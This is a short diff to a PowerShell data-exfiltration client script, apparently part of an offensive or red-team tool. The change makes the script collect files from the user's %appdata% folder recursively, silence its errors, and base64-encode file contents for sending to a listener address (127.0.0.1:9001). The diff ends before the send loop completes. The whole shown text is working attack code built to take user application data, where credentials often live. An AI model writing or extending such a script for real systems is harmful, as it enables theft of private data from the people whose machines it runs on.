@@ -1,15 +1,16 @@
 $fileList = "Exfil-client.ps1"
+$folder = "%appdata%"
 
-$exfilList = @()
+$exfilList = @($(ls -1 -R $folder))
 
 $IP="127.0.0.1:9001"
+
+$ErrorActionPreference = "SilentlyContinue"
 
 foreach ($file in $fileList){
     $text = Get-Content -Path $file
     $exfilList += [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text))
 }
-
-$ErrorActionPreference = "SilentlyContinue"
 
 foreach($data in $exfilList){
     Write-Output "Starting new data exfil..."
